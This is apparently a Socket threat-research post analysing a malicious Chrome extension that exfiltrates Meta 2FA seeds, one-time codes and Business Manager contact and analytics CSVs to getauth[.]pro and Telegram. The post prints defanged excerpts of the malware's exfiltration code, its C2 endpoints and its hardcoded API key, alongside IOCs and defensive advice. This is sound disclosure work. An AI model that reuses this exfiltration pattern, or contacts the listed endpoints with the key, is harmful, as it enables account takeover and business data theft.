---
title: "Malicious Chrome Extension Steals Meta Business Manager Exports and TOTP 2FA Seeds"
short_title: "Malicious Chrome Extension Steals Meta 2FA Seeds"
date: 2026-02-13 12:00:00 +0000
categories: [Malware, Browser Extensions]
tags: [Chrome Extension, 2FA, Meta, Threat Intelligence, Supply Chain Security, Credential Theft]
canonical_url: https://socket.dev/blog/malicious-chrome-extension-steals-meta-business-manager-exports-and-totp-2fa-seeds
source: Socket
image:
  path: https://cdn.sanity.io/images/cgdhsj6q/production/fbd6967f5da678c95170fdd4aea6664f72c6e892-1024x1024.png?w=1600&q=95&fit=max&auto=format
  alt: Malicious Chrome extension CL Suite artwork
description: "Chrome extension CL Suite by @CLMasters neutralizes 2FA for Facebook and Meta Business accounts while exfiltrating Business Manager contact and analytics data."
---
<div class="prose" dir="ltr">
<p>Socket’s Threat Research Team identified a malicious Google Chrome extension <a href="https://socket.dev/chrome/package/jkphinfhmfkckkcnifhjiplhfoiefffl/overview/1.0.1"><code>CL Suite by @CLMasters</code></a> (extension ID <code>jkphinfhmfkckkcnifhjiplhfoiefffl</code>), that openly advertises itself as a way to scrape Meta Business Suite data and bypass verification friction and that also, behind the scenes, exfiltrates TOTP seeds, 2FA codes, Business Manager contact lists, and analytics data to infrastructure controlled by the threat actor.</p>
<p>Marketed in the Chrome Web Store as a way to “extract people data, analyze Business Managers, remove verification popups, and generate 2FA codes”, the extension requests broad access to <code>meta.com</code> and <code>facebook.com</code> and claims in its privacy policy that 2FA secrets and Business Manager data remain local. In practice, the code transmits TOTP seeds and current one time security codes, Meta Business “People” CSV exports, and Business Manager analytics data to a backend at <code>getauth[.]pro</code>, with an option to forward the same payloads to a Telegram channel controlled by the threat actor.</p>
<p>By stealing TOTP seeds and codes for Facebook and Meta Business accounts, the extension effectively neutralizes 2FA protection and makes full account takeover trivial once a threat actor also has the corresponding password or recovery access from other sources such as infostealer logs or credential dumps. The exfiltrated Business Manager data includes names, emails, access levels, and associated ad accounts, giving the threat actor a detailed map of who controls which assets and enabling ad fraud, targeted compromise of additional employees, and long-term hijacking of business assets. The risk persists even after a victim uninstalls the extension, since the threat actor retains both the 2FA seeds and the exported business intelligence.</p>
<p>At the time of writing, the extension remains <a href="https://chromewebstore.google.com/detail/cl-suite-by-clmasters/jkphinfhmfkckkcnifhjiplhfoiefffl">live</a> on the Chrome Web Store. We have notified Google and flagged this extension for removal.</p>
<figure><img src="https://cdn.sanity.io/images/cgdhsj6q/production/7bc4f614fdee4c9cc3d78bbe9258451eab2521de-623x716.png?w=1600&q=95&fit=max&auto=format" alt="" loading="lazy"><figcaption><p><em>Socket AI Scanner’s analysis of the malicious <a href="https://socket.dev/chrome/package/jkphinfhmfkckkcnifhjiplhfoiefffl/overview/1.0.1">CL Suite by @CLMasters</a> Chrome extension highlights that its background <a href="https://socket.dev/chrome/package/jkphinfhmfkckkcnifhjiplhfoiefffl/files/1.0.1/js/background.js">script</a> collects Facebook account identifiers, 2FA seeds and codes, CSV exports, tab URL, public IP, and user agent, then exfiltrates this data with a hardcoded API key to getauth[.]pro telemetry and validation endpoints and forwards formatted dumps to a Telegram notification API, confirming deliberate credential and 2FA harvesting.</em></p></figcaption></figure>
<figure><img src="https://cdn.sanity.io/images/cgdhsj6q/production/f09092bd92606bb68f9f1a08ed72108ec76a5e39-1311x910.png?w=1600&q=95&fit=max&auto=format" alt="" loading="lazy"><figcaption><p><em><em>Chrome Web Store listing for the </em><em><code>CL Suite by @CLMasters</code></em><em> extension openly advertises the ability to “extract people data, analyze Business Managers, remove verification popups, and generate 2FA codes” for Meta accounts, while the underlying code also harvests TOTP seeds, 2FA codes, and Business Manager contact and analytics data and exfiltrates it to threat actor-controlled infrastructure.</em></em></p></figcaption></figure>
<h2>From “Meta Business Suite Tools” to Silent Infostealer</h2>
<p>Meta Business Suite and Facebook Business Manager are the administrative consoles organizations use to run their Facebook and Instagram presence at scale. From these panels, admins manage pages, ad accounts, pixels, catalogs, and user permissions for employees and agencies, and they can spend budget, change payment settings, add or remove staff, and control brand facing pages. In this context, any extension that sees those pages and their 2FA flows has direct exposure to high-value business data and authentication secrets.</p>
<figure><img src="https://cdn.sanity.io/images/cgdhsj6q/production/375a0a2fc8ff33cc51c6efad82daa1ae5d6d0471-1974x1756.png?w=1600&q=95&fit=max&auto=format" alt="" loading="lazy"><figcaption><p><em><em>Official Meta landing page for its business tools ecosystem, showing how Meta Business Suite, Business Manager, and Ads Manager provide a single admin surface for managing Facebook and Instagram pages, ads, and customer interactions, which highlights why any Chrome extension with access to these consoles, like </em><em><code>CL Suite by @CLMasters</code></em><em>, has direct reach into high-value business assets.</em></em></p></figcaption></figure>
<p><code>CL Suite by @CLMasters</code> is published in the Chrome Web Store under the developer alias <code>CLMasters</code>, with the registration email <code>info@clmasters[.]pro</code>. The extension first appeared in the store on March 1, 2025 and was last updated on March 6, 2025. The listing shows a small user base of 28 users at the time of writing, but any victim who installs it while managing corporate assets risks losing control of those assets and exposing internal contact data.</p>
<p>The same developer hosts a privacy policy titled “Meta Business Suite Tools” that claims:</p>
<ul><li>2FA secrets entered into the 2FA generator are stored locally in browser storage</li><li>Meta Business Suite “People” data is processed locally and only saved when the user explicitly downloads it</li><li>Any data sent to servers is anonymized usage data that does not contain personally identifiable information.</li></ul>
<p>The code tells a different story. Across multiple modules, the extension packages sensitive data, including TOTP seeds, current one time codes, Facebook usernames and emails, and full CSV exports of Meta Business “People” and Business Manager analytics, and sends it to a telemetry API at <code>getauth[.]pro</code>. Many of these telemetry events are tagged with <code>sendTelegram: true</code>, which instructs the backend to forward the same payload to a Telegram channel controlled by the threat actor. In other words, the extension systematically performs the exact data collection and exfiltration that its own privacy policy says will not happen.</p>
<figure><img src="https://cdn.sanity.io/images/cgdhsj6q/production/f995312af4e572be733bd50f38ce35a32e02ed2c-2048x1540.png?w=1600&q=95&fit=max&auto=format" alt="" loading="lazy"><figcaption><p><em><em>Privacy policy page for Meta Business Suite Tools on </em><em><code>clmasters[.]pro</code></em><em>, where the developer assures users that Meta Business Suite data and 2FA secrets are processed and stored locally in the browser, a claim that directly contradicts the extension’s actual behavior of transmitting the same data to the threat actor-controlled </em><em><code>getauth[.]pro</code></em><em> backend.</em></em></p></figcaption></figure>
<h2>Key Malicious Flows</h2>
<h3>2FA Generator: Exfiltrating TOTP Secrets and Codes</h3>
<p>For a browser-based 2FA helper like this extension, transmitting TOTP seeds or codes off device without explicit, informed consent is a serious security violation. <code>CL Suite</code> does exactly that. By stealing the seed and current codes for Facebook and Meta Business accounts, the extension effectively neutralizes 2FA and lets the threat actor generate valid codes indefinitely. On its own this does not steal the password, but once a password or recovery channel is compromised from other sources, account takeover becomes trivial and remains possible until 2FA is fully re-enrolled with a new secret.</p>
<h3>Exfiltration Pipeline to Threat Actor-Controlled C2 and Telegram</h3>
<p>Below, the code snippets show the core logic with our inline comments and defanged C2 endpoints. The <a href="https://socket.dev/chrome/package/jkphinfhmfkckkcnifhjiplhfoiefffl/files/1.0.1/js/background.js">background script</a> defines the C2 URLs and shared API key:</p>
<pre><code lang="javascript">const API_ENDPOINT             = &#x27;https://getauth[.]pro/api/telemetry.php&#x27;;
// Main telemetry / data exfiltration endpoint

const API_VALIDATION_ENDPOINT  = &#x27;https://getauth[.]pro/api/validate.php&#x27;;
// Endpoint the extension uses for “license” or feature validation

const TELEGRAM_NOTIFY_ENDPOINT = &#x27;https://getauth[.]pro/api/telegram_notify.php&#x27;;
// Backend relay that forwards selected payloads to Telegram

const API_KEY                  = &#x27;w7ZxKp3F8RtJmN5qL2yAcD9v&#x27;;
// Hardcoded bearer token shared by all installs</code></pre>
<p>These constants are hardcoded. Every installation reports to the same backend and uses the same bearer token. The background script also <a href="https://socket.dev/chrome/package/jkphinfhmfkckkcnifhjiplhfoiefffl/files/1.0.1/js/background.js#L24">fingerprints</a> the client’s public IP:</p>
<pre><code lang="javascript">async function getClientIP() {
  try {
    const response = await fetch(&#x27;https://api.ipify.org?format=json&#x27;);
    const data     = await response.json();
    return data.ip;    // Public IP, used for victim fingerprinting
  } catch (error) {
    return &#x27;Unknown&#x27;;
  }
}</code></pre>
<p>That IP becomes part of the telemetry payload and lets the threat actor correlate victims across sessions and environments.</p>
<h3>Client Side Telemetry Wrapper and C2 Flow</h3>
<p>Most exfiltration flows go through a shared helper in <a href="https://socket.dev/chrome/package/jkphinfhmfkckkcnifhjiplhfoiefffl/files/1.0.1/js/common.js#L9"><code>js/common.js</code></a>:</p>
<pre><code lang="javascript">// Generic helper to wrap and send telemetry
CLSuite.sendTelemetry = function (feature, data = {}, sendTelegram = false) {
  return new Promise((resolve) =&gt; {
    const os = CLSuite.getClientOS();     // Collect local OS fingerprint

    chrome.runtime.sendMessage({
      action:  &quot;telemetry&quot;,
      feature: feature,                   // Tag event source (e.g. 2fa, people_extractor)
      data: {
        ...data,                          // Merge caller data
        os:         os,
        timestamp:  new Date().toISOString(),
        sendTelegram: sendTelegram        // Flag for Telegram forwarding
      }
    }, function (response) {
      resolve(response);                  // Return C2 response to caller
    });
  });
};</code></pre>
<p>Key points:</p>
<ul><li><code>feature</code> labels the source module, for example <code>&#x27;2fa&#x27;</code>, <code>&#x27;people_extractor&#x27;</code>, or <code>&#x27;bm_analytics&#x27;</code></li><li><code>data</code> carries arbitrary payload fields; the helper automatically adds OS and a timestamp</li><li><code>sendTelegram</code> flags events that should also be forwarded to a Telegram channel.</li></ul>
<p>The background script receives these messages, augments them with <code>getClientIP()</code>, then POSTs the result to <code>API_ENDPOINT</code> with an <code>Authorization: Bearer &lt;API_KEY&gt;</code> header. If <code>sendTelegram</code> is true, it also calls <code>TELEGRAM_NOTIFY_ENDPOINT</code>. Structurally, this is a classic telemetry pipeline, but the payloads contain highly sensitive data that users never consent to send.</p>
<p>Across the background script and feature modules, many network and parsing operations are wrapped in empty <code>try { } catch (e) { }</code> blocks that silently swallow errors. This pattern hides failures from the user, reduces visible noise if exfiltration breaks, and shows that the developer prioritizes keeping the extension quiet over clear error reporting or maintainable behavior.</p>
<p>Dynamic analysis tests confirm that <code>https://getauth[.]pro/api/telemetry.php</code> is live, returns structured JSON, and enforces the bearer token. The TLS certificate for <code>getauth[.]pro</code> is valid, issued by a trusted CA, and was renewed on January 26, 2026 with expiry in April 2026, which indicates active maintenance.</p>
<h3>Stealing 2FA Secrets and Codes</h3>
<p>The malicious behavior appears when the extension sends the generated codes and associated account data off host. After computing the TOTP for the current Meta account, <a href="https://socket.dev/chrome/package/jkphinfhmfkckkcnifhjiplhfoiefffl/files/1.0.1/js/2fa-generator.js#L145"><code>2fa-generator.js</code></a> calls:</p>
<pre><code lang="javascript">// Send telemetry and request Telegram notification
CLSuite.sendTelemetry(&#x27;2fa&#x27;, {
  seed:           secret,            // TOTP secret (full 2FA seed)
  code:           code,              // Current 6-digit TOTP code
  facebook_user:  userInfo.username, // Facebook account identifier
  facebook_email: cleanEmail,        // Account email taken from UI
  sendTelegram:   true               // Also forward payload via Telegram
});</code></pre>
<p>This payload contains:</p>
<ul><li><code>seed</code>: the TOTP secret, which allows the threat actor to generate valid codes for that account</li><li><code>code</code>: the current six-digit TOTP value, confirming that the secret is valid</li><li><code>facebook_user</code> and <code>facebook_email</code>: identifiers tying the seed to a specific Meta business account.</li></ul>
<p>TOTP is time-based, so generating a specific code for a specific moment requires both the secret and the timestamp. In practice, the threat actor has both: the extension sends the current code together with a timestamp in the telemetry wrapper, and the threat actor’s server knows when it received the event. From that point on, the stolen seed lets the threat actor derive valid current and future codes for the account.</p>
<p>The privacy policy claims that 2FA secrets “are stored locally in your browser’s storage and are not transmitted to our servers except as noted below” and describes the “noted below” transmission only as anonymized usage data for diagnostics, stating that this data “does not contain personally identifiable information” and that <code>getauth[.]pro</code> is used “for extension validation” only. In reality, every use of the built in 2FA generator sends the full TOTP seed, current code, Facebook username, and email address to <code>getauth[.]pro</code>, with an option to mirror the same payload to Telegram, and the extension never presents an in-product warning or consent dialog. This behavior goes well beyond anonymized diagnostics or validation and directly contradicts the policy’s description of what leaves the browser.</p>
<h2>Exfiltrating Business Manager Contact Lists</h2>
<p>The People Extractor module (<code>j[s/people-extractor.js](&lt;https://socket.dev/chrome/package/jkphinfhmfkckkcnifhjiplhfoiefffl/files/1.0.1/js/people-extractor.js&gt;)</code>) targets the Business Manager “People” view on <code>facebook.com</code> and <code>meta.com</code>. It walks the DOM, extracts table rows, and builds a CSV with:</p>
<ul><li>Names and email addresses of Business Manager users,</li><li>Roles and permissions, and</li><li>Status and access details (invited, active, access level).</li></ul>
<p>The UI presents this as a convenience export. Under the hood, the same CSV is sent to the threat actor:</p>
<pre><code lang="javascript">// Send telemetry for exported Business Manager contacts
CLSuite.sendTelemetry(&#x27;people_extractor&#x27;, {
  peopleCount: peopleData.length,
  csvData:     csvContent,   // Full CSV: names, emails, roles, status, access details
  isDownload:  true          // Marks that user triggered a download
}, true);                    // Also request Telegram notification</code></pre>
<p>And again when extraction finishes:</p>
<pre><code lang="javascript">if (peopleData.length &gt; 0) {
  const csvContent = convertToCSV(peopleData);

  CLSuite.sendTelemetry(&#x27;people_extractor&#x27;, {
    peopleCount: peopleData.length,
    csvData:     csvContent   // Entire Business Manager user list sent to C2
  }, true);                   // Also request Telegram notification
}</code></pre>
<p>As a result, each “download” action gives the threat actor a complete roster of Business Manager users and their effective access. This directly contradicts the privacy policy’s promise that Meta Business Suite data is processed locally and that only anonymized usage data is transmitted.</p>
<h3>Business Manager Analytics and Payment Information</h3>
<p>A separate “failsafe” analytics module (<a href="https://socket.dev/chrome/package/jkphinfhmfkckkcnifhjiplhfoiefffl/files/1.0.1/js/failsafe-bm-analytics.js"><code>js/failsafe-bm-analytics.js</code></a>) enumerates Business Manager-level entities and their linked assets. The resulting CSV includes:</p>
<ul><li>Business Manager IDs and names,</li><li>Attached ad accounts,</li><li>Connected pages and assets, and</li><li>Billing and payment configuration details (which ad accounts use which funding sources).</li></ul>
<p>Once built, the module exfiltrates the report. The policy mentions <code>getauth[.]pro</code> only for “extension validation” and does not disclose any export of Business Manager analytics or payment related information. In practice, the threat actor receives near real-time insight into which Business Managers exist, which ad accounts they control, and how those accounts are funded, which can be used for prioritizing ad-fraud or account-hijacking attempts.</p>
<p>In all of these flows, the heavy lifting (TOTP math, DOM scraping, CSV generation) happens locally, but the extension deliberately and unconditionally mirrors the sensitive results to a remote server and Telegram whenever the features are used.</p>
<h2>Outlook and Recommendations</h2>
<p><code>CL Suite by @CLMasters</code> shows how a narrow browser extension can repackage data scraping as a “tool” for Meta Business Suite and Facebook Business Manager. Its people extraction, Business Manager analytics, popup suppression, and in browser 2FA generation are not neutral productivity features, they are purpose-built scrapers for high-value Meta surfaces that collect contact lists, access metadata, and 2FA material straight from authenticated pages. Wiring each of these scraping flows into the same telemetry and Telegram pipeline makes the extension behave less like a helper and more like an infostealer focused on business intelligence and long-lived authentication material.</p>
<p>Even with a few dozen installs, an extension that weakens 2FA and clones Business Manager contact lists and analytics gives the threat actor enough context to identify high-value targets and come back later using credentials obtained elsewhere. As platforms tighten API access and harden against automated scraping, especially in the wake of LLM training and data-licensing disputes, we should expect more browser-based tools that openly offer scraping and “friction reduction” for specific platforms while quietly sending a copy of everything to the operator. Similar designs are likely to appear against ad platforms, CRM backends, and cloud admin consoles: a browser extension that promises exports or 2FA help, requests broad host access, then streams seeds, codes, and structured business data to a backend and real-time channels.</p>
<p>Organizations should tighten control over extensions on systems that access Meta Business Suite, Facebook Business Manager, and comparable consoles by enforcing allow lists, reviewing high-privilege extensions, and monitoring for unusual network traffic and domains. Detection teams can turn this case into concrete rules by looking for extensions with very broad host permissions, shared bearer tokens, hidden telemetry wrappers, and unexpected flows of TOTP seeds or business contacts. To bring supply chain security into the browser itself, use <a href="https://chromewebstore.google.com/detail/socket-security/jbcobpbfgkhmjfpjjepkcocalmpkiaop?pli=1"><strong>Socket’s Chrome extension protection</strong></a> to inventory extensions in use, surface requested permissions and host access, and block risky updates before they land on endpoints, leveraging the same analysis engine Socket applies to other open source ecosystems.</p>
<h2>Indicators of Compromise (IOCs)</h2>
<h3>Malicious Chrome Extension</h3>
<ul><li>Name: <a href="https://socket.dev/chrome/package/jkphinfhmfkckkcnifhjiplhfoiefffl/overview/1.0.1"><code>CL Suite by @CLMasters</code></a></li><li>Extension ID: <code>jkphinfhmfkckkcnifhjiplhfoiefffl</code></li></ul>
<h3><strong>Threat Actor Identifiers</strong></h3>
<ul><li>Website: <code>clmasters[.]pro</code></li><li>Email (Chrome Web Store): <code>info@clmasters[.]pro</code></li><li>Privacy policy contact: <code>privacy@clmasters[.]pro</code></li></ul>
<h3>C2 Infrastructure and API Key</h3>
<ul><li>Domain: <code>getauth[.]pro</code></li><li>Telemetry endpoint: <code>https://getauth[.]pro/api/telemetry.php</code></li><li>Validation endpoint: <code>https://getauth[.]pro/api/validate.php</code></li><li>Telegram notification endpoint: <code>https://getauth[.]pro/api/telegram_notify.php</code></li><li>API key: <code>w7ZxKp3F8RtJmN5qL2yAcD9v</code></li></ul>
<h2>MITRE ATT&amp;CK</h2>
<ul><li>T1195.002 — Supply Chain Compromise: Compromise Software Supply Chain</li><li>T1176.001 — Software Extensions: Browser Extensions</li><li>T1204 — User Execution</li><li>T1059.007 — Command and Scripting Interpreter: JavaScript</li><li>T1005 — Data from Local System</li><li>T1119 — Automated Collection</li><li>T1590.005 — Gather Victim Network Information: IP Addresses</li><li>T1589.002 — Gather Victim Identity Information: Email Addresses</li><li>T1591.002 — Gather Victim Org Information: Business Relationships</li><li>T1556.006 — Modify Authentication Process: Multi-Factor Authentication</li><li>T1071.001 — Application Layer Protocol: Web Protocols</li><li>T1567 — Exfiltration Over Web Service</li></ul>
</div>
